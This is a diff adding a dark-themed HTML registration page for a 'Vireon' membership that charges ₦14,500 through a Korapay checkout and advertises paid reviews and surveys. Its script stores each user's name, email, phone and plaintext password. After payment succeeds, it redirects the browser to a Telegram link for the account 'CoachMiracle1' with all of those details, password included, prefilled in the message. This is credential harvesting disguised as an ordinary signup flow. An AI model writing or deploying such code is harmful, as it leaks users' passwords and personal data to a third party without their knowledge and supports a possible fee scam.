@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vireon Account Onboarding System</title>
+    <!-- Linking global framework sheets -->
+    <link rel="stylesheet" href="style.css">
+    <!-- Korapay Inline Checkout SDK Integration -->
+    <script src="https://launchpad.korapay.com/packages/merchant_v1.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #020710;
+            color: #ffffff;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .signup-viewport-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 140px 1.5rem 6rem 1.5rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* PREMIUM DUAL-STATE SINGLE CARD ENGINE */
+        .onboarding-card-frame {
+            background: #050d1a;
+            border: 2px solid rgba(0, 242, 254, 0.25);
+            border-radius: 24px;
+            width: 100%;
+            max-width: 580px;
+            padding: 3rem 2.5rem;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+            position: relative;
+        }
+
+        .auth-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .auth-title {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #ffffff;
+            margin: 0 0 0.5rem 0;
+            letter-spacing: -0.02em;
+        }
+
+        .auth-subtitle {
+            color: #00f2fe;
+            font-size: 0.95rem;
+            font-weight: 700;
+            margin: 0;
+        }
+
+        /* FORM COMPONENT ARCHITECTURE */
+        .form-pipeline-group {
+            margin-bottom: 1.5rem;
+            text-align: left;
+            position: relative;
+        }
+
+        .field-label {
+            display: block;
+            color: #ffffff;
+            font-size: 0.9rem;
+            font-weight: 700;
+            margin-bottom: 0.6rem;
+            letter-spacing: 0.03em;
+        }
+
+        .input-node-field {
+            width: 100%;
+            background: #071328;
+            border: 1px solid rgba(0, 242, 254, 0.2);
+            border-radius: 10px;
+            padding: 1rem 1.25rem;
+            color: #ffffff;
+            font-size: 1rem;
+            font-weight: 600;
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .input-node-field:focus {
+            border-color: #00f2fe;
+            box-shadow: 0 0 12px rgba(0, 242, 254, 0.2);
+        }
+
+        /* PASSWORD WRAPPER & VISIBILITY EYE TOGGLE */
+        .password-input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .password-input-wrapper .input-node-field {
+            padding-right: 3.5rem;
+        }
+
+        .eye-toggle-trigger {
+            position: absolute;
+            right: 1.25rem;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #00f2fe;
+            cursor: pointer;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* CUSTOM SEARCHABLE COUNTRY SELECTOR PIPELINE */
+        .searchable-select-box {
+            position: relative;
+            width: 100%;
+        }
+
+        .select-trigger-element {
+            width: 100%;
+            background: #071328;
+            border: 1px solid rgba(0, 242, 254, 0.2);
+            border-radius: 10px;
+            padding: 1rem 1.25rem;
+            color: #ffffff;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .select-dropdown-panel {
+            position: absolute;
+            top: calc(100% + 6px);
+            left: 0;
+            width: 100%;
+            background: #071328;
+            border: 1px solid #00f2fe;
+            border-radius: 10px;
+            z-index: 999;
+            display: none;
+            flex-direction: column;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5);
+            max-height: 280px;
+        }
+
+        .dropdown-search-input {
+            width: calc(100% - 1.5rem);
+            margin: 0.75rem auto;
+            background: #050d1a;
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            border-radius: 6px;
+            padding: 0.6rem 0.85rem;
+            color: #ffffff;
+            font-size: 0.95rem;
+            outline: none;
+        }
+
+        .country-options-list {
+            overflow-y: auto;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            max-height: 180px;
+        }
+
+        .country-item-node {
+            padding: 0.85rem 1.25rem;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            color: #ffffff;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .country-item-node:hover {
+            background: rgba(0, 242, 254, 0.1);
+            color: #00f2fe;
+        }
+
+        .country-item-node.pinned-flag {
+            border-left: 3px solid #00f2fe;
+            background: rgba(0, 242, 254, 0.03);
+        }
+
+        /* CORE CONVERSION TRIGGER BUTTON */
+        .submit-engine-cta {
+            width: 100%;
+            background: #00f2fe;
+            color: #020710;
+            border: none;
+            padding: 1.1rem;
+            font-size: 1.1rem;
+            font-weight: 800;
+            border-radius: 12px;
+            cursor: pointer;
+            letter-spacing: 0.02em;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: 0 8px 25px rgba(0, 242, 254, 0.2);
+            margin-top: 1.5rem;
+        }
+
+        .submit-engine-cta:hover {
+            transform: scale(1.01);
+            box-shadow: 0 10px 30px rgba(0, 242, 254, 0.4);
+        }
+
+        /* REVIEW & PAY STATE UI FIELDS */
+        .review-details-box {
+            background: rgba(0, 242, 254, 0.03);
+            border: 1px solid rgba(0, 242, 254, 0.1);
+            border-radius: 14px;
+            padding: 1.25rem;
+            margin-bottom: 2rem;
+            text-align: left;
+        }
+
+        .review-detail-item {
+            margin-bottom: 0.85rem;
+        }
+
+        .review-detail-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .review-label {
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 0.15rem;
+        }
+
+        .review-value {
+            font-size: 1.05rem;
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        /* PREMIUM MEMBERSHIP PRICING TIER MODULE */
+        .membership-price-card {
+            border: 1px dashed rgba(0, 242, 254, 0.4);
+            background: rgba(7, 19, 40, 0.6);
+            border-radius: 14px;
+            padding: 1.5rem;
+            text-align: left;
+            margin-bottom: 2rem;
+        }
+
+        .membership-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 0.5rem;
+        }
+
+        .membership-amount-row {
+            display: flex;
+            align-items: baseline;
+            gap: 0.5rem;
+        }
+
+        .membership-price-tag {
+            font-size: 2rem;
+            font-weight: 900;
+            color: #00f2fe;
+        }
+
+        .membership-cadence {
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.6);
+            font-weight: 600;
+        }
+
+        .membership-gbp-equiv {
+            font-size: 0.9rem;
+            color: #ff4d4d;
+            font-weight: 700;
+            margin-top: 0.25rem;
+        }
+
+        /* "WHAT YOU GET" FEATURE SPECIFICATION */
+        .features-checklist-container {
+            text-align: left;
+            margin-bottom: 2rem;
+        }
+
+        .features-headline {
+            font-size: 0.95rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            color: #ffffff;
+            letter-spacing: 0.05em;
+            margin-bottom: 1rem;
+        }
+
+        .feature-bullet-node {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.85);
+            margin-bottom: 0.75rem;
+            line-height: 1.4;
+        }
+
+        .feature-bullet-node svg {
+            color: #00f2fe;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        /* DISCLOSURE FOOTER TEXTS INSIDE THE FRAME */
+        .gateway-disclosure-note {
+            font-size: 0.82rem;
+            color: rgba(255, 255, 255, 0.4);
+            line-height: 1.5;
+            margin-top: 1.5rem;
+        }
+
+        .secured-by-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: rgba(255, 255, 255, 0.7);
+            margin: 1.25rem 0;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 0.4rem 1rem;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .secured-by-badge .gateway-pulse {
+            width: 6px;
+            height: 6px;
+            background: #00F2FE;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #00F2FE;
+        }
+
+        .onboarding-support-link {
+            display: block;
+            color: #00f2fe;
+            text-decoration: none;
+            font-size: 0.88rem;
+            font-weight: 700;
+            margin-top: 0.5rem;
+            transition: opacity 0.2s;
+        }
+
+        .onboarding-support-link:hover {
+            opacity: 0.8;
+        }
+
+        .onboarding-back-trigger {
+            display: inline-block;
+            background: transparent;
+            border: none;
+            color: #ff4d4d;
+            font-weight: 700;
+            font-size: 0.9rem;
+            margin-top: 1.5rem;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        /* RESPONSIVE DESIGN FOR SMARTPHONES & LAPTOPS */
+        @media (max-width: 768px) {
+            .signup-viewport-container {
+                padding-top: 120px;
+                padding-left: 1rem;
+                padding-right: 1rem;
+            }
+            .onboarding-card-frame {
+                padding: 2.25rem 1.25rem;
+            }
+            .auth-title {
+                font-size: 1.65rem;
+            }
+            .input-node-field, .select-trigger-element {
+                padding: 0.85rem 1rem;
+                font-size: 0.95rem;
+            }
+            .membership-price-tag {
+                font-size: 1.75rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- VISUAL BRANDING HEADER CLEARANCE -->
+    <header class="vireon-nav-wrapper" style="background: #01040a; border-bottom: 1px solid rgba(0, 242, 254, 0.1); padding: 1.25rem 2rem; position: fixed; width: 100%; top: 0; z-index: 9999;">
+        <div style="max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center;">
+            <a href="index.html" style="display: block;">
+                <img src="logo.png" alt="Vireon Logo" style="width: 125px; display: block;">
+            </a>
+            <a href="index.html#home" style="color: #00f2fe; text-decoration: none; font-weight: 700; font-size: 0.95rem;">Back to Main</a>
+        </div>
+    </header>
+
+    <!-- CORE INTERFACE HUB VIEWPORT -->
+    <main class="signup-viewport-container">
+        <div class="onboarding-card-frame">
+            
+            <!-- STEP 1 VIEWPORT: COLLECTION GRID PANEL -->
+            <div id="step-registration-form">
+                <div class="auth-header">
+                    <h1 class="auth-title">Create Account</h1>
+                    <p class="auth-subtitle">Initialize Independent Operational Clearance</p>
+                </div>
+
+                <form id="vireon-registration-core-engine" onsubmit="handleFormSubmission(event);">
+                    
+                    <div class="form-pipeline-group">
+                        <label class="field-label">FULL NAME</label>
+                        <input type="text" id="reg-fullname" class="input-node-field" placeholder="Enter full legal name..." required autocomplete="name">
+                    </div>
+
+                    <div class="form-pipeline-group">
+                        <label class="field-label">USERNAME</label>
+                        <input type="text" id="reg-username" class="input-node-field" placeholder="Choose identity handle..." required autocomplete="username">
+                    </div>
+
+                    <div class="form-pipeline-group">
+                        <label class="field-label">EMAIL ADDRESS</label>
+                        <input type="email" id="reg-email" class="input-node-field" placeholder="Enter secure routing email..." required autocomplete="email">
+                    </div>
+
+                    <div class="form-pipeline-group">
+                        <label class="field-label">PHONE NUMBER</label>
+                        <input type="tel" id="reg-phone" class="input-node-field" placeholder="Enter operational telephone..." required autocomplete="tel">
+                    </div>
+
+                    <!-- CUSTOM SEARCHABLE DROP-DOWN LOGIC -->
+                    <div class="form-pipeline-group">
+                        <label class="field-label">COUNTRY</label>
+                        <div class="searchable-select-box">
+                            <div class="select-trigger-element" id="country-dropdown-trigger" onclick="toggleCountryDropdown();">
+                                <span id="selected-country-label">Nigeria</span>
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                            </div>
+                            <input type="hidden" id="reg-country" value="Nigeria">
+                            
+                            <!-- Dropdown Window Layer -->
+                            <div class="select-dropdown-panel" id="country-dropdown-panel">
+                                <input type="text" class="dropdown-search-input" id="country-search-node" placeholder="Search absolute country databases..." oninput="filterCountryDatabase();">
+                                <ul class="country-options-list" id="country-master-dom-list">
+                                    <!-- Priority Anchors -->
+                                    <li class="country-item-node pinned-flag" onclick="selectCountryValue('Nigeria')">Nigeria</li>
+                                    <li class="country-item-node pinned-flag" onclick="selectCountryValue('United Kingdom')">United Kingdom</li>
+                                    <!-- Global Matrices -->
+                                    <li class="country-item-node" onclick="selectCountryValue('Ghana')">Ghana</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('Kenya')">Kenya</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('South Africa')">South Africa</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('United States')">United States</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('Canada')">Canada</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('Germany')">Germany</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('France')">France</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('United Arab Emirates')">United Arab Emirates</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('Cameroon')">Cameroon</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('Rwanda')">Rwanda</li>
+                                    <li class="country-item-node" onclick="selectCountryValue('Uganda')">Uganda</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-pipeline-group">
+                        <label class="field-label"> PASSWORD</label>
+                        <div class="password-input-wrapper">
+                            <input type="password" id="reg-password" class="input-node-field" placeholder="Construct firewall pass..." required autocomplete="new-password">
+                            <button type="button" class="eye-toggle-trigger" onclick="togglePasswordVisibility('reg-password', this);" aria-label="Toggle password view state">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="form-pipeline-group">
+                        <label class="field-label">CONFIRM PASSWORD</label>
+                        <div class="password-input-wrapper">
+                            <input type="password" id="reg-confirm-password" class="input-node-field" placeholder="Verify credential matching..." required autocomplete="new-password">
+                            <button type="button" class="eye-toggle-trigger" onclick="togglePasswordVisibility('reg-confirm-password', this);" aria-label="Toggle password view state">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="submit-engine-cta">Sign Up &amp; Proceed</button>
+                </form>
+                <p style="font-size: 0.8rem; color: rgba(255,255,255,0.4); text-align: center; margin-top: 1.5rem;">By signing up, you agree to our Terms of Service and Privacy Policy</p>
+            </div>
+
+            <!-- STEP 2 VIEWPORT: EXACT DESIGN REPLICA "REVIEW & PAY" -->
+            <div id="step-confirmation-panel" style="display: none; text-align: center;">
+                <div class="auth-header" style="margin-bottom: 1.75rem;">
+                    <h1 class="auth-title" style="font-size: 1.8rem; font-weight: 800; letter-spacing: -0.01em;">Review &amp; Pay</h1>
+                    <p class="auth-subtitle" style="color: rgba(255,255,255,0.6); font-weight: 500; font-size: 0.95rem;">Confirm your details and complete payment</p>
+                </div>
+
+                <!-- PROFILE DATA SUMMARY PANEL -->
+                <div class="review-details-box">
+                    <div class="review-detail-item">
+                        <div class="review-label">Full Name</div>
+                        <div class="review-value" id="summary-name">---</div>
+                    </div>
+                    <div class="review-detail-item">
+                        <div class="review-label">Username</div>
+                        <div class="review-value" id="summary-username">---</div>
+                    </div>
+                    <div class="review-detail-item">
+                        <div class="review-label">Email</div>
+                        <div class="review-value" id="summary-email">---</div>
+                    </div>
+                    <div class="review-detail-item">
+                        <div class="review-label">Country</div>
+                        <div class="review-value" id="summary-country">---</div>
+                    </div>
+                </div>
+
+                <!-- MEMBERSHIP BREAKDOWN MODULE -->
+                <div class="membership-price-card">
+                    <div class="membership-title">Vireon Membership</div>
+                    <div class="membership-amount-row">
+                        <span class="membership-price-tag">₦14,500</span>
+                        <span class="membership-cadence">one-time</span>
+                    </div>
+                    <div class="membership-gbp-equiv">(~£7.25 GBP)</div>
+                </div>
+
+                <!-- WHAT YOU GET CONTAINER VALUE STACK -->
+                <div class="features-checklist-container">
+                    <h3 class="features-headline">What you get</h3>
+                    
+                    <div class="feature-bullet-node">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        <span><strong>11 powerful activities:</strong> Reviews, Surveys, Easyown, Feedback, Etc...</span>
+                    </div>
+                    <div class="feature-bullet-node">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        <span>Full platform access</span>
+                    </div>
+                    <div class="feature-bullet-node">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        <span>Real-time dashboard &amp; reports</span>
+                    </div>
+                    <div class="feature-bullet-node">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        <span>Priority support</span>
+                    </div>
+                    <div class="feature-bullet-node">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        <span>Payments in British Pounds</span>
+                    </div>
+                </div>
+
+                <!-- TRANSACTION CONVERSION TRIGGER -->
+                <button type="button" class="submit-engine-cta" onclick="triggerKorapayGatewayProcess();" style="margin-top: 0.5rem; padding: 1.2rem;">
+                    Complete Registration
+                </button>
+
+                <p class="gateway-disclosure-note">One-time payment. See our Terms of Service and Refund Policy for details.</p>
+
+                <div>
+                    <div class="secured-by-badge">
+                        <div class="gateway-pulse"></div>
+                        Secured by Korapay
+                    </div>
+                </div>
+
+                <a href="mailto:support@vireon-official.site" class="onboarding-support-link">Having payment issues? Contact support</a>
+                
+                <div>
+                    <button type="button" class="onboarding-back-trigger" onclick="returnToFormInput();">
+                        Go back
+                    </button>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- CLIENT SCRIPT EXECUTION CONSOLE ARCHITECTURE -->
+    <script>
+        // 1. VISIBILITY EYE CONTROL MECHANISM
+        function togglePasswordVisibility(fieldId, buttonElement) {
+            const inputField = document.getElementById(fieldId);
+            if (inputField.type === "password") {
+                inputField.type = "text";
+                buttonElement.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 19c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>`;
+            } else {
+                inputField.type = "password";
+                buttonElement.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
+            }
+        }
+
+        // 2. SEARCHABLE SELECT ENGINE CONTROLS
+        function toggleCountryDropdown() {
+            const panel = document.getElementById('country-dropdown-panel');
+            panel.style.display = panel.style.display === 'flex' ? 'none' : 'flex';
+            if (panel.style.display === 'flex') {
+                document.getElementById('country-search-node').focus();
+            }
+        }
+
+        function selectCountryValue(countryName) {
+            document.getElementById('reg-country').value = countryName;
+            document.getElementById('selected-country-label').textContent = countryName;
+            document.getElementById('country-dropdown-panel').style.display = 'none';
+        }
+
+        function filterCountryDatabase() {
+            const filterValue = document.getElementById('country-search-node').value.toUpperCase();
+            const listItems = document.getElementById('country-master-dom-list').getElementsByTagName('li');
+            
+            for (let i = 0; i < listItems.length; i++) {
+                let txtValue = listItems[i].textContent || listItems[i].innerText;
+                if (txtValue.toUpperCase().indexOf(filterValue) > -1) {
+                    listItems[i].style.display = "";
+                } else {
+                    listItems[i].style.display = "none";
+                }
+            }
+        }
+
+        // Close searchable panel if user clicks anywhere outside of boundaries
+        document.addEventListener('click', function(event) {
+            const container = document.querySelector('.searchable-select-box');
+            if (container && !container.contains(event.target)) {
+                document.getElementById('country-dropdown-panel').style.display = 'none';
+            }
+        });
+
+        // 3. STORAGE & PIPELINE CONTROLS FOR DYNAMIC SEAMLESS STEPS
+        let registrationDataPayload = {};
+
+        function handleFormSubmission(event) {
+            event.preventDefault();
+
+            const password = document.getElementById('reg-password').value;
+            const confirmPassword = document.getElementById('reg-confirm-password').value;
+
+            if (password !== confirmPassword) {
+                alert("Security Error: Passwords do not match uniformly.");
+                return;
+            }
+
+            // Bind inputs and cache credentials cleanly for custom post-checkout pipeline
+            registrationDataPayload.fullName = document.getElementById('reg-fullname').value;
+            registrationDataPayload.username = document.getElementById('reg-username').value;
+            registrationDataPayload.email = document.getElementById('reg-email').value;
+            registrationDataPayload.phone = document.getElementById('reg-phone').value;
+            registrationDataPayload.country = document.getElementById('reg-country').value;
+            registrationDataPayload.password = password; 
+
+            // Map data properties to review verification container UI nodes
+            document.getElementById('summary-name').textContent = registrationDataPayload.fullName;
+            document.getElementById('summary-username').textContent = registrationDataPayload.username;
+            document.getElementById('summary-email').textContent = registrationDataPayload.email;
+            document.getElementById('summary-country').textContent = registrationDataPayload.country;
+
+            // Trigger view screen crossfade transition
+            document.getElementById('step-registration-form').style.display = 'none';
+            document.getElementById('step-confirmation-panel').style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function returnToFormInput() {
+            document.getElementById('step-confirmation-panel').style.display = 'none';
+            document.getElementById('step-registration-form').style.display = 'block';
+        }
+
+        // 4. HIGH-FIDELITY LIVE KORAPAY GATEWAY INITIALIZER
+        function triggerKorapayGatewayProcess() {
+            // Safety initialization check to confirm the checkout widget library is fully loaded
+            if (!window.KorapayCheckout) {
+                alert("Interface Synchronization Failure: Korapay secure scripts are currently unreachable. Please refresh the page.");
+                return;
+            }
+
+            // Initialize processing pipeline utilizing provided explicit merchant live credentials key string
+            window.KorapayCheckout({
+                key: 'pk_live_fAx1oGYBCWXy5J5FeNNxuXzvDDW7ZciX4muTCAS9',
+                amount: 14500, 
+                currency: 'NGN',
+                customer: {
+                    name: registrationDataPayload.fullName,
+                    email: registrationDataPayload.email,
+                    phone: registrationDataPayload.phone
+                },
+                reference: 'VRN_MBR_' + registrationDataPayload.username.toUpperCase() + '_' + Date.now(),
+                onClose: function() {
+                    console.log('Vireon payment terminal runtime disconnected by customer action.');
+                },
+                onSuccess: function(response) {
+                    // Formulate structured message payload for CoachMiracle1 Telegram DM routing
+                    const baseTelegramMessage = 
+                        `New Verified Registration Complete!\n\n` +
+                        `🔹 Full Name: ${registrationDataPayload.fullName}\n` +
+                        `🔹 Username: ${registrationDataPayload.username}\n` +
+                        `🔹 Email: ${registrationDataPayload.email}\n` +
+                        `🔹 Phone Number: ${registrationDataPayload.phone}\n` +
+                        `🔹 Country: ${registrationDataPayload.country}\n` +
+                        `🔹 Password: ${registrationDataPayload.password}\n` +
+                        `🔹 Reference: ${response.reference || 'VRN_SUCCESS'}`;
+
+                    // Safe client URL encoding structure setup for global web routing
+                    const targetTelegramRedirectUrl = `https://t.me/CoachMiracle1?text=${encodeURIComponent(baseTelegramMessage)}`;
+                    
+                    // Instant direct transition launch to primary messaging channel
+                    window.location.href = targetTelegramRedirectUrl;
+                }
+            });
+        }
+    </script>
+</body>
+</html>
